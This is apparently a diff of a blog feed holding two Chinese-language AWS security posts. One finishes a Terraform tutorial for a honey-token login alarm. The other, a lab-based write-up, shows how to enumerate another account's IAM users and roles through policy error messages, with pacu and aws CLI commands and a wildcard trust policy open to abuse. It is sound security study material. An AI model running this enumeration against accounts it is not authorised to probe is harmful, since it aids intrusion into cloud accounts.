+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720096232046-d4e44916-ecfd-46dd-9d1a-32bb64bd398e.png" alt="image.png" loading="lazy"></p>
+<p>周期配置为<code>1分钟</code>，阈值配置为<code>&gt;=1</code>。这意味着在任何给定的 1 分钟周期内，如果该用户至少登录一次，就会触发告警。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097123625-3a798543-86f4-4c00-b571-4d45b911bf7d.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097131806-61322baa-f631-4eab-a170-3dfcac72b3ad.png" alt="image.png" loading="lazy"></p>
+<p>在下一步配置告警如何处理，这里我们创建一个主题，把告警发送到我们的邮箱。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097357712-bbdbaeca-df16-4537-a114-b385a1d1010b.png" alt="image.png" loading="lazy"></p>
+<p>在下一步配置下表述<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097519442-b13ea343-032b-4562-b6c6-d25149aab6cd.png" alt="image.png" loading="lazy"></p>
+<p>这样告警就配置好了<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720097591519-0767394b-93c3-4c69-82e7-c1f6029c5f49.png" alt="image.png" loading="lazy"></p>
+<p>最后在到邮箱里确认下订阅<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720098089437-e0940d82-5efb-4b8c-8e2e-3bb57f17bb41.png" alt="image.png" loading="lazy"></p>
+<p>在 CLI 中尝试登录 honeyUser，Honey_Alarm 变为告警中<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720099278832-158f8623-26c2-4f18-9580-d19989da553c.png" alt="image.png" loading="lazy"></p>
+<p>同时邮箱收到告警<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720099318259-d036533c-2f5d-4e06-9824-159e034d54ac.png" alt="image.png" loading="lazy"></p>
+<p>实验完后记得清理刚刚创建的内容，以免产生额外的费用</p>
+<ul>
+<li>CloudWatch Log 告警</li>
+<li>CloudWatch Log 日志组</li>
+<li>Amazon SNS</li>
+<li>CloudTrail 追踪</li>
+<li>S3</li>
+<li>IAM角色</li>
+<li>IAM客户托管策略</li>
+<li>IAM用户 honeyUser</li>
+</ul>
+<h1 id="使用terraform代码创建">使用Terraform代码创建</h1>
+<p>Terraform是一个基础设施即代码（IaC）工具，简而言之它让我们可以用代码的方式对云上的各个资源进行创建、配置和更新。</p>
+<p>对于上面的创建流程大致可以分为几步：</p>
+<ul>
+<li>创建一个<strong>IAM用户</strong>，作为诱饵用户。</li>
+<li>创建一个<strong>CloudTrail追踪</strong>，并创建一个<strong>S3桶</strong>来存储日志。</li>
+<li>创建一个<strong>CloudWatch Log日志组</strong>来分析日志，同时还要一个拥有创建/推送日志流权限的<strong>IAM角色</strong>向日志组中推送日志。</li>
+<li>创建一个<strong>CloudWatch Log日志筛选</strong>，同时为它创建一个<strong>CloudWatch Log告警</strong>，再创建一个<strong>SNS主题</strong>用来接收告警，并为它配置好<strong>endpoint</strong>，也就是我们的邮箱地址。</li>
+</ul>
+<p>在使用Terraform代码实现这个流程之前，先准备好一个空目录，里面创建文件结构如下</p>
+<pre><code>./
+├── main.tf
+├── outputs.tf
+└── povider.tf
+</code></pre>
+<p>其中：</p>
+<ul>
+<li>provider.tf：用来配置 AWS povider</li>
+<li>main.tf：包含了主要的资源配置</li>
+<li>outputs.tf：用来定义输出变量</li>
+</ul>
+<p>本次实验的版本<code>Terraform v1.8.5</code>，同时提前缓存好了AWS povider。下面开始coding</p>
+<h2 id="创建aws用户">创建AWS用户</h2>
+<p>首先编写<code>povider.tf</code>，配置好<code>region</code>和<code>AK/SK</code></p>
+<pre><code class="language-yaml">provider &quot;aws&quot; {
+  region     = &quot;us-east-1&quot;
+  access_key = &quot;&lt;aws_access_key&gt;&quot;
+  secret_key = &quot;&lt;aws_secret_key&gt;&quot;
+}
+</code></pre>
+<p><code>main.tf</code>创建诱饵用户，同时开启凭证访问</p>
+<pre><code class="language-yaml"># 诱饵用户 backup_admin
+resource &quot;aws_iam_user&quot; &quot;backup_admin&quot; {
+  name = &quot;backup-admin&quot;
+}
+
+resource &quot;aws_iam_access_key&quot; &quot;backup_admin_key&quot; {
+  user = aws_iam_user.backup_admin.name
+}
+</code></pre>
+<p><code>outputs.tf</code>将AK/SK输出。因为密钥属于敏感信息，无法直接在控制台输出，所以要为变量设置<code>sensitive = true</code>。若要查看使用命令：<code>terraform output -json</code></p>
+<pre><code class="language-yaml">output &quot;access_key_id&quot; {
+  value     = aws_iam_access_key.backup_admin_key.id
+  sensitive = true
+}
+
+output &quot;secret_access_key&quot; {
+  value     = aws_iam_access_key.backup_admin_key.secret
+  sensitive = true
+}
+</code></pre>
+<p>编辑好之后依次输入命令</p>
+<pre><code class="language-yaml">terraform init
+terraform plan
+terraform apply
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720448356405-25ad5bf7-8edc-44e8-9b30-570329459b00.png" alt="image.png" loading="lazy"></figure>
+<p>这样Terraform就自动为我们创建了这个<code>backup-admin</code>用户<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720505884086-59865913-dd1a-4b9b-a46c-dde8bc052656.png" alt="image.png" loading="lazy"></p>
+<h2 id="创建配置cloudtrail">创建配置CloudTrail</h2>
+<p>首先定义好当前AWS用户的数据源，之后创建的时候会用到其中的信息</p>
+<pre><code class="language-yaml"># AWS 元数据
+data &quot;aws_caller_identity&quot; &quot;current&quot; {}
+
+data &quot;aws_partition&quot; &quot;current&quot; {}
+
+data &quot;aws_region&quot; &quot;current&quot; {}
+</code></pre>
+<p>然后是创建CloudTrail的代码</p>
+<pre><code class="language-yaml"># 创建 CloudTrail 
+resource &quot;aws_cloudtrail&quot; &quot;cloudtrail_honey&quot; {
+  name                          = &quot;cloudtrail_honey&quot;
+  s3_bucket_name                = aws_s3_bucket.cloudtrail_bucket.id
+  include_global_service_events = true
+  is_multi_region_trail         = true
+
+  depends_on = [aws_s3_bucket_policy.cloudtrail_bucket_policy]
+}
+
+# CloudTrail 所用的 S3 配置
+resource &quot;aws_s3_bucket&quot; &quot;cloudtrail_bucket&quot; {
+  bucket        = &quot;cloudtrail-bucket-honey&quot;
+  force_destroy = true
+}
+
+data &quot;aws_iam_policy_document&quot; &quot;cloudtrail_bucket_policy_document&quot; {
+  statement {
+    sid    = &quot;AWSCloudTrailAclCheck&quot;
+    effect = &quot;Allow&quot;
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
+    }
+
+    actions   = [&quot;s3:GetBucketAcl&quot;]
+    resources = [aws_s3_bucket.cloudtrail_bucket.arn]
+    condition {
+      test     = &quot;StringEquals&quot;
+      variable = &quot;aws:SourceArn&quot;
+      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
+    }
+  }
+
+  statement {
+    sid    = &quot;AWSCloudTrailWrite&quot;
+    effect = &quot;Allow&quot;
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
+    }
+
+    actions   = [&quot;s3:PutObject&quot;]
+    resources = [&quot;${aws_s3_bucket.cloudtrail_bucket.arn}/AWSLogs/${data.aws_caller_identity.current.account_id}/*&quot;]
+
+    condition {
+      test     = &quot;StringEquals&quot;
+      variable = &quot;s3:x-amz-acl&quot;
+      values   = [&quot;bucket-owner-full-control&quot;]
+    }
+    condition {
+      test     = &quot;StringEquals&quot;
+      variable = &quot;aws:SourceArn&quot;
+      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
+    }
+  }
+}
+
+resource &quot;aws_s3_bucket_policy&quot; &quot;cloudtrail_bucket_policy&quot; {
+  bucket = aws_s3_bucket.cloudtrail_bucket.id
+  policy = data.aws_iam_policy_document.cloudtrail_bucket_policy_document.json
+}
+</code></pre>
+<p>下面一步一步说明，首先是 <code>resource &quot;aws_cloudtrail&quot;</code> 块。这里我们定义了一个<strong>AWS CloudTrail追踪器</strong>其中：</p>
+<ul>
+<li><code>name</code>指定的是CloudTrail追踪器的名称为<code>cloudtrail_honey</code>。</li>
+<li><code>s3_bucket_name</code>指定存储 CloudTrail 日志的 Amazon S3 桶的名称。这里引用了另一个 Terraform 资源 aws_s3_bucket，该资源的 ID 被用作 S3 桶的名称。</li>
+<li><code>include_global_service_events = true</code>设置启用了全球服务事件的记录，如 AWS Identity and Access Management (IAM) 操作。这意味着不仅限于地理区域特定的服务，全球服务的事件也会被记录。</li>
+<li><code>is_multi_region_trail = true</code>启用多区域追踪，确保所有 AWS 区域中的事件都被记录。</li>
+<li><code>depends_on = [aws_s3_bucket_policy.cloudtrail_bucket_policy]</code>这是一个 Terraform 的隐式依赖关系声明，用来确保在创建 CloudTrail 追踪器之前，相关的 S3 桶策略已经被创建和应用。</li>
+</ul>
+<pre><code class="language-yaml">resource &quot;aws_cloudtrail&quot; &quot;cloudtrail_honey&quot; {
+  name                          = &quot;cloudtrail_honey&quot;
+  s3_bucket_name                = aws_s3_bucket.cloudtrail_bucket.id
+  include_global_service_events = true
+  is_multi_region_trail         = true
+  
+  depends_on = [aws_s3_bucket_policy.cloudtrail_bucket_policy]
+}
+</code></pre>
+<p>接下来定义了一个供<code>cloudtrail_honey</code>使用的S3以及该S3的策略。其中</p>
+<ul>
+<li><strong>force_destroy</strong>：当设置为 true 时，这个属性允许 Terraform 在执行 terraform destroy 命令时删除存储桶，即使存储桶中还包含文件。这是为了确保在测试或临时部署的情况下，资源可以被完全清理。</li>
+<li><strong>data &quot;aws_iam_policy_document&quot;</strong>：策略文档将要定义 AWS CloudTrail 写入日志文件的权限。</li>
+<li><strong>policy</strong>：将前面定义的 IAM 策略文档（序列化为 JSON 格式）应用到指定的存储桶。这样，存储桶的访问权限就根据这个策略进行了配置。</li>
+</ul>
+<pre><code class="language-yaml">resource &quot;aws_s3_bucket&quot; &quot;cloudtrail_bucket&quot; {
+  bucket        = &quot;cloudtrail-bucket-honey&quot;
+  force_destroy = true
+}
+
+data &quot;aws_iam_policy_document&quot; &quot;cloudtrail_bucket_policy_document&quot; {
+  ......
+}
+
+resource &quot;aws_s3_bucket_policy&quot; &quot;cloudtrail_bucket_policy&quot; {
+  bucket = aws_s3_bucket.cloudtrail_bucket.id
+  policy = data.aws_iam_policy_document.cloudtrail_bucket_policy_document.json
+}
+</code></pre>
+<p>S3的策略文档主要是让 CloudTrail 能够将日志存储到该 S3 中。这个策略包含两个主要的声明 (statement)：</p>
+<ul>
+<li>第一条声明: AWSCloudTrailAclCheck
+<ul>
+<li><strong>主体 (Principals)</strong>：指定服务主体为 cloudtrail.amazonaws.com，意味着这条规则专为 CloudTrail 服务设置。</li>
+<li><strong>动作 (Actions)</strong>：允许动作 s3:GetBucketAcl，使 CloudTrail 能检查存储桶的权限设置。</li>
+<li><strong>资源 (Resources)</strong>：限制权限到特定的 S3 存储桶（aws_s3_bucket.cloudtrail_bucket.arn）。</li>
+<li><strong>条件 (Condition)</strong>：确保只有当请求来自特定 CloudTrail 追踪器 (cloudtrail_honey) 时，才允许访问。通过匹配请求的来源 ARN 来强化安全措施。</li>
+</ul>
+</li>
+<li>第二条声明: AWSCloudTrailWrite
+<ul>
+<li><strong>主体 (Principals)</strong>：同样指定服务主体为 cloudtrail.amazonaws.com。</li>
+<li><strong>动作 (Actions)</strong>：允许动作 s3:PutObject，授权 CloudTrail 向指定路径写入日志文件。</li>
+<li><strong>资源 (Resources)</strong>：指定 CloudTrail 可以写入到的具体对象路径，包括 AWS 账户 ID 和存储桶 ARN 的组合，确保日志数据的组织和隔离。</li>
+<li><strong>条件 (Condition)</strong>：
+<ul>
+<li>s3:x-amz-acl 确保所有写入的对象设置为 bucket-owner-full-control，这为存储桶所有者提供了对日志文件的完全控制权。</li>
+<li>aws:SourceArn 条件同第一条声明，保证只有特定 CloudTrail 追踪器的请求才被允许。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-yaml">data &quot;aws_iam_policy_document&quot; &quot;cloudtrail_bucket_policy_document&quot; {
+  statement {
+    sid    = &quot;AWSCloudTrailAclCheck&quot;
+    effect = &quot;Allow&quot;
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
+    }
+
+    actions   = [&quot;s3:GetBucketAcl&quot;]
+    resources = [aws_s3_bucket.cloudtrail_bucket.arn]
+    condition {
+      test     = &quot;StringEquals&quot;
+      variable = &quot;aws:SourceArn&quot;
+      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
+    }
+  }
+
+  statement {
+    sid    = &quot;AWSCloudTrailWrite&quot;
+    effect = &quot;Allow&quot;
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
+    }
+
+    actions   = [&quot;s3:PutObject&quot;]
+    resources = [&quot;${aws_s3_bucket.cloudtrail_bucket.arn}/AWSLogs/${data.aws_caller_identity.current.account_id}/*&quot;]
+
+    condition {
+      test     = &quot;StringEquals&quot;
+      variable = &quot;s3:x-amz-acl&quot;
+      values   = [&quot;bucket-owner-full-control&quot;]
+    }
+    condition {
+      test     = &quot;StringEquals&quot;
+      variable = &quot;aws:SourceArn&quot;
+      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
+    }
+  }
+}
+</code></pre>
+<p>还是用之前的命令部署，完成之后可以看到生成的 S3 和 CloudTrail追踪器<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720508544812-92692e4e-8d47-4783-968c-a0a86d891be4.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720508590128-fe79ebe2-5fe0-4433-82d1-e37fb2542849.png" alt="image.png" loading="lazy"></p>
+<h2 id="创建cloudwatch-log日志组">创建CloudWatch Log日志组</h2>
+<p>创建CloudWatch Log日志组之前，还要要准备一个IAM角色让CloudTrail可以将日志推送到日志组中。</p>
+<pre><code class="language-yaml"># 修改 cloudtrail，添加写入日志组的角色和日志组
+resource &quot;aws_cloudtrail&quot; &quot;cloudtrail_honey&quot; {
+  ......
+  
+  cloud_watch_logs_group_arn    = &quot;${aws_cloudwatch_log_group.cloudwatch_log_group_honey.arn}:*&quot;
+  cloud_watch_logs_role_arn     = aws_iam_role.cloudtrail_logging_role.arn
+    
+  ......
+}
+
+# 创建CloudWatch Log日志组
+resource &quot;aws_cloudwatch_log_group&quot; &quot;cloudwatch_log_group_honey&quot; {
+  name = &quot;cloudwatch-log-group-honey&quot;
+}
+
+# 创建 CloudTrail 推送日志组的角色
+resource &quot;aws_iam_role&quot; &quot;cloudtrail_logging_role&quot; {
+  name               = &quot;cloudtrail-logging-role&quot;
+
+  assume_role_policy = jsonencode({
+    Version = &quot;2012-10-17&quot;
+    Statement = [
+      {
+        Action = &quot;sts:AssumeRole&quot;
+        Principal = {
+          Service = &quot;cloudtrail.amazonaws.com&quot;
+        }
+        Effect = &quot;Allow&quot;
+        Sid    = &quot;&quot;
+      },
+    ]
+  })
+}
+
+resource &quot;aws_iam_role_policy&quot; &quot;cloudtrail_logging_role_policy&quot; {
+  name      = &quot;cloudtrail-logging-role-policy&quot;
+  role      = aws_iam_role.cloudtrail_logging_role.id
+
+  policy    = jsonencode({
+    Version = &quot;2012-10-17&quot;
+    Statement = [
+      {
+        Action = [
+          &quot;logs:CreateLogStream&quot;,
+          &quot;logs:PutLogEvents&quot;
+        ],
+        Effect   = &quot;Allow&quot;,
+        Resource = &quot;${aws_cloudwatch_log_group.cloudwatch_log_group_honey.arn}:log-stream:*&quot;
+      },
+    ]
+  })
+}
+</code></pre>
+<p>这里和前面控制台不一样的是，IAM角色添加的是一个内联策略而不是一个托管策略。其中对于<strong>logs:CreateLogStream</strong>和<strong>logs:PutLogEvents</strong>权限对应的<code>Resource</code>写法为<code>${aws_cloudwatch_log_group.example.arn}:log-stream:*</code>，这个表示该日志组下的所有日志流。</p>
+<p>重新部署，在CloudWatch的Live Tail中查看实时的日志<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720510175780-b7079c09-b6e2-468d-97d1-45f1fc2c199f.png" alt="image.png" loading="lazy"></p>
+<h2 id="创建告警">创建告警</h2>
+<p>首先创建一个 CloudWatch Logs 的指标过滤器用来过滤出诱饵账户的行为：</p>
+<ul>
+<li>Resource: aws_cloudwatch_log_metric_filter
+<ul>
+<li><code>log_group_name = aws_cloudwatch_log_group.cloudwatch_log_group_honey.name</code>指定应用该过滤器的日志组。</li>
+</ul>
+</li>
+<li>Metric Transformation
+<ul>
+<li><code>name = &quot;honeyToken&quot;</code>：这是创建的 CloudWatch 指标的名称，当日志匹配到上述模式时，此指标会被触发或更新。</li>
+<li><code>namespace = &quot;honeyAlarm&quot;</code>：指标的命名空间，命名空间用于隔离各个指标集合，防止命名冲突。</li>
+<li><code>value = &quot;1&quot;</code>：每当日志匹配到模式时，指标的值增加 1。这意味着你可以通过观察这个指标的变化来检测匹配到的日志事件的频率。</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-yaml">resource &quot;aws_cloudwatch_log_metric_filter&quot; &quot;honeyUser_filter&quot; {
+  name           = &quot;honeyUser_metric_filter&quot;
+  pattern        = &quot;{ $.userIdentity.type = \&quot;IAMUser\&quot; &amp;&amp; $.userIdentity.userName = \&quot;${aws_iam_user.backup_admin.name}\&quot; }&quot;
+  log_group_name = aws_cloudwatch_log_group.cloudwatch_log_group_honey.name
+
+  metric_transformation {
+    name      = &quot;honeyToken&quot;
+    namespace = &quot;honeyAlarm&quot;
+    value     = &quot;1&quot;
+  }
+}
+</code></pre>
+<p>创建告警同时配置接受告警的邮箱：</p>
+<ul>
+<li>Resource: aws_cloudwatch_metric_alarm
+<ul>
+<li><code>comparison_operator = &quot;GreaterThanOrEqualToThreshold&quot;</code>：这个比较操作符定义了触发告警的条件，表示当监控的指标值大于或等于设置的阈值时，告警将被触发。</li>
+<li><code>evaluation_periods = &quot;1&quot;</code>：表示评估期数，即 CloudWatch 会考虑最近的一个指定周期（在这里是60秒）的数据点来判断是否触发告警。</li>
+<li><code>metric_name/namespace</code>：告警将监控 honeyAlarm 命名空间下的 metric_name 指标，也就是刚刚配置的内容</li>
+<li><code>period = 60</code>：指定的周期（以秒为单位），意味着 CloudWatch 会每60秒收集一次指标数据，并用这些数据来评估是否触发告警。</li>
+<li><code>statistic** **= &quot;Sum&quot;</code>：统计方法，表示在每个评估周期内，CloudWatch 将对收集的数据点求和来进行比较判断。</li>
+<li><code>threshold = 1</code>：告警的触发阈值，结合上述的 comparison_operator，意味着如果在一个周期内（60秒）指标“honeyToken”的总和大于或等于1，则触发告警。</li>
+<li><code>alarm_actions = [aws_sns_topic.alarm_topic.arn]</code>：当告警状态变为 ALARM 时，将触发的动作列表。在这里，指定了一个 Amazon SNS 主题的 ARN，当告警触发时，将向这个 SNS 主题发送通知。</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-yaml"># 创建告警
+resource &quot;aws_cloudwatch_metric_alarm&quot; &quot;backup_admin_alarm&quot; {
+  alarm_name          = &quot;BackupAdminActivityAlarm&quot;
+  comparison_operator = &quot;GreaterThanOrEqualToThreshold&quot;
+  evaluation_periods  = &quot;1&quot;
+  metric_name         = &quot;honeyToken&quot;
+  namespace           = &quot;honeyAlarm&quot;
+  period              = 60
+  statistic           = &quot;Sum&quot;
+  threshold           = 1
+  alarm_description   = &quot;Alarm when backup-admin performs any activity.&quot;
+  alarm_actions       = [aws_sns_topic.alarm_topic.arn]
+}
+
+# 创建SNS并配置邮件
+resource &quot;aws_sns_topic&quot; &quot;alarm_topic&quot; {
+  name = &quot;backup-admin-activity-topic&quot;
+}
+
+resource &quot;aws_sns_topic_subscription&quot; &quot;alarm_subscription&quot; {
+  topic_arn = aws_sns_topic.alarm_topic.arn
+  protocol  = &quot;email&quot;
+  endpoint  = &quot;skky@blu3.com&quot;
+}
+</code></pre>
+<p>apply之后去邮箱里面确认订阅便可接受告警信息了。<code>terraform output -json</code>输出账户凭证，然后在CLI登录。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720513588154-04e69601-a07c-4680-a076-70a790598a6f.png" alt="image.png" loading="lazy"></p>
+<p>邮箱收到告警<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720513799153-03a6e07b-7ddb-4181-9a53-32791b56b9e4.png" alt="image.png" loading="lazy"></p>
+<p>实验完之后执行<code>terraform destroy</code>清理掉刚刚创建的所有资源。非常方便😎<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720514314472-ec0e5420-83f0-4562-836d-732c9d3abcf9.png" alt="image.png" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>这个回顾这个流程，其中CloudTrail追踪、CloudWatch Log日志组、SNS主题等资源是相对来说不会变的。属于诱饵账户的部分就只有一个IAM用户和它的CloudWatch告警。所以我们的tf代码逻辑上应该分为两个部分：</p>
+<ul>
+<li>一部分是基础资源的创建，这里创建完之后要提供一个CloudWatch Log日志组名称和SNS主题。</li>
+<li>另一个部分是诱饵资源创建，也就是创建一个IAM用户和并它的告警。</li>
+</ul>
+<p>这样之后再创建、修改诱饵资源的时候就可以只专注于诱饵资源的代码了<br>
+<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720515078560-dc9ccd94-27f2-4825-9b42-0c19866abd77.png" alt="image.png" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://pwnedlabs.io/labs/detect-malicious-activity-with-aws-honey-tokens">https://pwnedlabs.io/labs/detect-malicious-activity-with-aws-honey-tokens</a><br>
+<a href="https://wiki.teamssix.com/CloudNative/Terraform/terraform-introductory.html">https://wiki.teamssix.com/CloudNative/Terraform/terraform-introductory.html</a><br>
+<a href="https://lonegunmanb.github.io/introduction-terraform/3.4.%E8%BE%93%E5%87%BA%E5%80%BC.html">https://lonegunmanb.github.io/introduction-terraform/3.4.%E8%BE%93%E5%87%BA%E5%80%BC.html</a><br>
+<a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail">https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail</a><br>
+<a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_metric_alarm">https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_metric_alarm</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[AWS Account ID Reconnaissance]]></title>
+        <id>https://skyblu3519.github.io/post/aws-account-id-reconnaissance/</id>
+        <link href="https://skyblu3519.github.io/post/aws-account-id-reconnaissance/">
+        </link>
+        <updated>2024-07-03T15:16:12.000Z</updated>
+        <content type="html"><![CDATA[<p>当获得一个AWS Account ID之后我们可能会对这个ID去做一些信息收集，而该账户的 IAM User/Role 是会被考虑的一个信息。下面就记一下如何通过一个 Account ID 收集该账户的 IAM User/Role。</p>
+<h1 id="使用角色信任策略">使用角色信任策略</h1>
+<p>假设我们现在拿到了一个账户ID为<code>427648302155</code>，我现在想知道这个账户下有哪些User和Role。</p>
+<p>首先，我们在自己的AWS账户里随便新建一个角色，并将信任策略配置为</p>
+<pre><code class="language-shell">{
+	&quot;Version&quot;: &quot;2012-10-17&quot;,
+	&quot;Statement&quot;: [
+		{
+			&quot;Sid&quot;: &quot;Statement1&quot;,
+			&quot;Effect&quot;: &quot;Deny&quot;,
+			&quot;Principal&quot;: {
+			    &quot;AWS&quot;: &quot;*&quot;
+			},
+			&quot;Action&quot;: &quot;sts:AssumeRole&quot;
+		}
+	]
+}
+</code></pre>
+<p>创建好之后我们点击进入角色，编辑信任策略<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720015041788-f8c779ad-ba14-4682-b64f-ed71f0c1722c.png" alt="image.png" loading="lazy"></p>
+<p>修改 Principal -&gt; AWS 为<code>427648302155</code>下的一个 User/Role，比如<code>arn:aws:iam::427648302155:user/admin</code>。然后我们更新策略，出现报错<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720015370572-6256f360-a090-4b7f-9c09-0a608016345b.png" alt="image.png" loading="lazy"></p>
+<p>这个ID是 Pwnedlabs实验 <a href="https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket">Identify the AWS Account ID from a Public S3 Bucket</a> 中的ID，它存在一个用户是 <code>s3user</code>。现在我们修改<code>AWS</code>为<code>arn:aws:iam::427648302155:user/s3user</code>，发现策略成功更新。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720015526370-8fd71f01-0804-4e97-ad32-889f21f67ad8.png" alt="image.png" loading="lazy"></p>
+<p>通过这种方式我们就能枚举一个账户下它的 IAM User/Role，如果目标的某个角色信任策略配置错误，比如</p>
+<pre><code class="language-shell">{
+	&quot;Version&quot;: &quot;2012-10-17&quot;,
+	&quot;Statement&quot;: [
+		{
+			&quot;Sid&quot;: &quot;Statement1&quot;,
+			&quot;Effect&quot;: &quot;Allow&quot;,
+			&quot;Principal&quot;: {
+			    &quot;AWS&quot;: &quot;*&quot;
+			},
+			&quot;Action&quot;: &quot;sts:AssumeRole&quot;
+		}
+	]
+}
+</code></pre>
+<p>那我们就可以扮演该角色，以获取目标的更多信息。云渗透工具pacu的<code>iam__enum_roles</code>模块就是用这种方式实现的。在使用时我们将<code>--role-name</code>配置为当前账户中一个可用角色，<code>--account-id</code>设置为要枚举的目标ID，工具便会用自己的字典对该目标进行枚举</p>
+<pre><code class="language-shell">run iam__enum_users --role-name IAMEnum --account-id 104506445608
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720016049180-bf641fc4-95b1-4ca2-8182-ec87cfb5e6c8.png" alt="image.png" loading="lazy"></figure>
+<h1 id="使用s3lambda访问策略">使用S3/Lambda访问策略</h1>
+<p>这两种方法和上面的也是大同小异，都是根据将一个IAM主体付给S3/Lambda策略上时的报错信息进行判断的。这里就不再赘述，详见实验：<a href="https://pwnedlabs.io/labs/unauthenticated-aws-iam-principals-enumeration">https://pwnedlabs.io/labs/unauthenticated-aws-iam-principals-enumeration</a></p>
+<p>S3</p>
+<pre><code class="language-json">{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [
+    {
+      &quot;Sid&quot;: &quot;IAM Enum&quot;,
+      &quot;Effect&quot;: &quot;Deny&quot;,
+      &quot;Principal&quot;: {
+        &quot;AWS&quot;: &quot;arn:aws:iam::104506445608:role/batch&quot;
+      },
+      &quot;Action&quot;: &quot;s3:GetObject&quot;,
+      &quot;Resource&quot;: &quot;arn:aws:s3:::iam-enum/*&quot;
+    }
+  ]
+}
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1718630007343-fa9b91ff-2f6e-4bbe-a9fa-422465bf14f7.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1718630011701-f152e5e3-ece7-4fa5-9428-6f62304450af.png" alt="image.png" loading="lazy"></p>
+<p>Lambda</p>
+<pre><code class="language-json">aws lambda add-permission --function-name IAMEnum --action lambda:GetFunction --statement-id IAMEnum --principal &quot;arn:aws:iam::104506445608:role/admin&quot;
+aws lambda add-permission --function-name IAMEnum --action lambda:GetFunction --statement-id IAMEnum --principal &quot;arn:aws:iam::104506445608:role/batch&quot;
+</code></pre>
+<h1 id="获取公开s3的-aws-account-id">获取公开S3的 AWS Account ID</h1>
+<p>实验环境：<a href="https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket">Identify the AWS Account ID from a Public S3 Bucket</a></p>
+<p>主要说下这个原理。在题目给的网页中我们可以看到它使用的S3名称：<code>mega-big-tech</code><br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1717052598303-c7b3fdf7-1835-488e-b80e-126a712129b7.png" alt="image.png" loading="lazy"></p>
+<p>是一个公开的S3，可以直接访问查看<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1717052644607-27717787-9a44-458e-ad18-4a69ac87851a.png" alt="image.png" loading="lazy"></p>
+<p>使用的方法参考：<a href="https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/">Finding the Account ID of any public S3 bucket</a></p>
+<p>下面讲下这个原理，首先我们创建一个角色，权限使用AWS托管策略里面的<code>AmazonS3ReadOnlyAccess</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017041271-aaf68d48-1a8f-48e7-963e-b2ee25da9b51.png" alt="image.png" loading="lazy"></p>
+<p>扮演这个角色我们是可以列出这个S3的内容的<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017346073-b20dc36e-3b8b-4d4c-9dd1-fce829155f85.png" alt="image.png" loading="lazy"></p>
